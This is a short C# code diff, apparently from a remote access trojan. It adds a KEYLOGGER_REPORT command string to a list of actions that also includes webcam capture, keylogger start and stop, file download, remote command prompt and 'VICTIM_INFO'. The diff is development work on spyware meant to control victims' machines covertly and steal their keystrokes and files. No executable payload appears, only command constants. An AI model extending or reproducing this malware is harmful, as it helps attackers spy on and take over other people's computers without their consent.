@@ -14,6 +14,7 @@
             public static readonly string TAKE_WEBCAM_SCREEN = "/ACTION=TAKE_WEBCAM_SCREEN";
             public static readonly string KEYLOGGER_START = "/ACTION=KEYLOGGER_START";
             public static readonly string KEYLOGGER_STOP = "/ACTION=KEYLOGGER_STOP";
+            public static readonly string KEYLOGGER_REPORT = "/ACTION=KEYLOGGER_REPORT";
             public static readonly string DOWNLOAD_FILE = "/ACTION=DOWNLOAD_FILE";
             public static readonly string COMMAND_PROMPT = "/ACTION=COMMAND_PROMPT";
             public static readonly string VICTIM_INFO = "/ACTION=VICTIM_INFO";
